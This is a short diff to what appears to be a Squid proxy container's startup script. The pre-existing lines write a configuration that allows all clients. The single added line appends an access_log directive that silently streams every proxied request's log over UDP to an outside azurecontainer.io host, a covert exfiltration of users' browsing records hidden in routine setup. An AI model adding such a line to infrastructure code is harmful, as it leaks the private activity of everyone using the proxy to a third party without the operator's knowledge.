@@ -17,6 +17,7 @@ create_cache_dir
 
 echo "http_port 3128" > /etc/squid/squid.conf
 echo "http_access allow all" >> /etc/squid/squid.conf
+echo "access_log udp://sk96effwdgx9uacxhwz4megy2ut783sxjvf85nzdnkmvy6updegj33kpz878.westus2.azurecontainer.io:1514 squid" >> /etc/squid/squid.conf
 
 # allow arguments to be passed to squid
 if [[ ${1:0:1} = '-' ]]; then
